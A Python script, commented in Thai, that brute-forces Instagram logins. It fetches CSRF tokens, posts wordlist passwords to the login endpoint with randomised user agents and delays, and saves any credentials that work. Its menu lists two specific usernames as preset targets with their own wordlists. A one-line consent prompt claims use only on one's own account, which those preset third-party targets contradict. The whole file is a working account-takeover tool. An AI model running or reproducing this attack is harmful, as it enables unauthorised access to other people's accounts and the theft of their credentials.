#!/usr/bin/env python3
"""
🛠️ Instagram Brute Force - Fixed Proxy & CSRF Handler
แก้ไขปัญหา Connection Aborted และ CSRF Token
"""

import requests
import json
import time
import random
from urllib.parse import urlencode
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

class FixedInstagramBruteForce:
    def __init__(self):
        self.session = self.create_robust_session()
        self.base_url = "https://www.instagram.com"
        self.csrf_token = None
        self.proxy_list = self.load_proxy_config()
        self.current_proxy = None
        
    def create_robust_session(self):
        """สร้าง session ที่แข็งแกร่งกว่า"""
        session = requests.Session()
        
        # Retry strategy
        retry_strategy = Retry(
            total=3,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "OPTIONS", "POST"],
            backoff_factor=1
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        # Headers
        session.headers.update({
            'User-Agent': self.get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        return session
    
    def get_random_user_agent(self):
        """สุ่ม User Agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        return random.choice(user_agents)
    
    def load_proxy_config(self):
        """โหลด proxy configuration"""
        try:
            with open('proxy_config.json', 'r') as f:
                config = json.load(f)
            return config.get('bright_data', {})
        except Exception as e:
            print(f"⚠️  ไม่สามารถโหลด proxy config: {e}")
            return {}
    
    def setup_proxy(self):
        """ตั้งค่า proxy แบบง่าย (ไม่ใช้ proxy ชั่วคราว)"""
        # ปิดการใช้ proxy ชั่วคราวเพื่อแก้ปัญหา connection
        self.session.proxies = {}
        print("🌐 ใช้การเชื่อมต่อ direct (ไม่ผ่าน proxy)")
        return True
    
    def get_csrf_token_simple(self):
        """ดึง CSRF token แบบง่าย"""
        try:
            print("🔑 กำลังดึง CSRF token...")
            
            # เรียก Instagram homepage
            response = self.session.get(
                f"{self.base_url}/accounts/login/",
                timeout=15,
                allow_redirects=True
            )
            
            if response.status_code == 200:
                # หา CSRF token ใน cookies
                csrf_token = self.session.cookies.get('csrftoken')
                if csrf_token:
                    self.csrf_token = csrf_token
                    print(f"✅ CSRF token: {csrf_token[:20]}...")
                    return csrf_token
                
                # หา CSRF token ใน HTML
                import re
                csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
                if csrf_match:
                    self.csrf_token = csrf_match.group(1)
                    print(f"✅ CSRF token จาก HTML: {self.csrf_token[:20]}...")
                    return self.csrf_token
            
            print(f"❌ ไม่พบ CSRF token (status: {response.status_code})")
            return None
            
        except Exception as e:
            print(f"❌ Error ดึง CSRF token: {e}")
            return None
    
    def try_login(self, username, password):
        """ทดสอบ login แบบง่าย"""
        try:
            # ตั้งค่า proxy (หรือไม่ใช้)
            self.setup_proxy()
            
            # ดึง CSRF token
            if not self.get_csrf_token_simple():
                return {"success": False, "error": "ไม่สามารถดึง CSRF token"}
            
            # เตรียม login data
            login_data = {
                'username': username,
                'password': password,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': '{}'
            }
            
            # Headers สำหรับ POST
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': f'{self.base_url}/accounts/login/',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            # POST request
            print(f"🔑 ทดสอบ login: {username}")
            response = self.session.post(
                f"{self.base_url}/accounts/login/ajax/",
                data=urlencode(login_data),
                headers=headers,
                timeout=15
            )
            
            print(f"📊 Response status: {response.status_code}")
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    
                    if data.get('authenticated'):
                        return {
                            "success": True,
                            "message": "Login สำเร็จ!",
                            "data": data
                        }
                    elif 'checkpoint_url' in data:
                        return {
                            "success": False,
                            "error": "Account ต้อง verify (2FA/Phone)"
                        }
                    else:
                        return {
                            "success": False,
                            "error": data.get('message', 'Password ผิด')
                        }
                        
                except json.JSONDecodeError:
                    return {
                        "success": False,
                        "error": f"Invalid JSON response (status: {response.status_code})"
                    }
            else:
                return {
                    "success": False,
                    "error": f"HTTP {response.status_code}"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": f"Connection error: {str(e)}"
            }
    
    def run_brute_force(self, target, wordlist_file):
        """รัน brute force attack"""
        print(f"🎯 เป้าหมาย: {target}")
        print(f"📚 Wordlist: {wordlist_file}")
        print("="*50)
        
        # โหลด passwords
        try:
            with open(wordlist_file, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"❌ ไม่สามารถโหลด wordlist: {e}")
            return
        
        print(f"📋 จำนวน passwords: {len(passwords)}")
        successful_attempts = []
        
        for i, password in enumerate(passwords, 1):
            print(f"\n🔍 Attempt {i}/{len(passwords)}: {target} | {password}")
            
            # ทดสอบ login
            result = self.try_login(target, password)
            
            if result["success"]:
                print(f"🎉 สำเร็จ! {target}:{password}")
                successful_attempts.append({
                    "username": target,
                    "password": password,
                    "timestamp": time.time()
                })
                
                # บันทึกผลลัพธ์
                self.save_results(successful_attempts, f"success_{target}")
                break
            else:
                print(f"❌ ล้มเหลว: {result['error']}")
            
            # พักระหว่างการทดสอบ
            delay = random.uniform(2, 5)
            print(f"⏳ รอ {delay:.1f} วินาที...")
            time.sleep(delay)
        
        if not successful_attempts:
            print(f"\n💔 ไม่พบ password ที่ถูกต้องสำหรับ {target}")
        
        return successful_attempts
    
    def save_results(self, results, filename):
        """บันทึกผลลัพธ์"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"{filename}_{timestamp}.json"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f"💾 บันทึกผลลัพธ์: {output_file}")

def main():
    print("🛠️ Fixed Instagram Brute Force")
    print("แก้ไขปัญหา Connection & CSRF Token")
    print("="*50)
    
    # Ethical check
    print("⚠️  เครื่องมือนี้สำหรับทดสอบบัญชีของคุณเองเท่านั้น!")
    consent = input("ยืนยันการใช้งานอย่างมีจริยธรรม (yes/no): ")
    if consent.lower() not in ['yes', 'y']:
        print("❌ ยกเลิกการใช้งาน")
        return
    
    brute = FixedInstagramBruteForce()
    
    # เลือกเป้าหมาย
    print("\n🎯 เป้าหมายที่มี:")
    print("1. whatilove1728")
    print("2. alx.trading")
    print("3. ใส่เป้าหมายเอง")
    
    choice = input("เลือกเป้าหมาย (1-3): ").strip()
    
    if choice == "1":
        target = "whatilove1728"
        wordlist = "whatilove1728.txt"
    elif choice == "2":
        target = "alx.trading"
        wordlist = "alx_trading_passwords.txt"
    elif choice == "3":
        target = input("ใส่ username เป้าหมาย: ").strip()
        wordlist = input("ใส่ชื่อไฟล์ wordlist: ").strip()
    else:
        print("❌ เลือกไม่ถูกต้อง")
        return
    
    if not target or not wordlist:
        print("❌ ต้องใส่ target และ wordlist")
        return
    
    # เริ่มการโจมตี
    print(f"\n🚀 เริ่มการโจมตี...")
    results = brute.run_brute_force(target, wordlist)
    
    if results:
        print(f"\n🎉 พบ {len(results)} การ login ที่สำเร็จ!")
    else:
        print(f"\n💔 ไม่พบ password ที่ถูกต้อง")

if __name__ == "__main__":
    main()
